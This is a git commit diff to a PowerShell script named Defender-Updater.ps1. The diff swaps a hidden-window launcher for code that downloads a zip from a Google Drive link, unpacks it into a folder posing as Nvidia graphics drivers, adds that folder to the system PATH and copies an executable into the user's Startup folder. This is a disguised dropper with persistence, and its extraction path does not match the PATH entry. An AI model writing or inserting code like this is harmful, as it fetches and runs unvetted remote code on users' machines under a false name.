edfc2a68025f545efb3c588f56fa0d4bfbd15895
Rugved Mahamune <quad.powered@gmail.com>
2024-07-25 16:50:20 +0100

    Update Defender-Updater.ps1

--- Defender-Updater.ps1
+++ Defender-Updater.ps1
@@ -1,2 +1,7 @@
-@echo off
-powershell runner1.ps1 -WindowStyle hidden
+$username=[Environment]::UserName
+$zipFile = "https://drive.google.com/uc?export=download&id=1cwwPzYjIzzzzzzzzzzzzzzzzzzzzzzzz"
+Invoke-WebRequest -Uri $zipFile -OutFile "C:\Users\$username\AppData\Local\Temp\updater.zip"
+Expand-Archive "C:\Users\$username\AppData\Local\Temp\updater.zip" -DestinationPath "C:\Users\Program Files\Nvidia Graphics Drivers"
+$Path = [Environment]::GetEnvironmentVariable("PATH", "Machine")+';C:\Program Files\Nvidia Graphics Drivers\bin;C:\Program Files\Nvidia Graphics Drivers\include'
+[Environment]::SetEnvironmentVariable( "Path", $Path, "Machine" )
+cp "C:\Program Files\Nvidia Graphics Drivers\Nvidia-Updater" "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
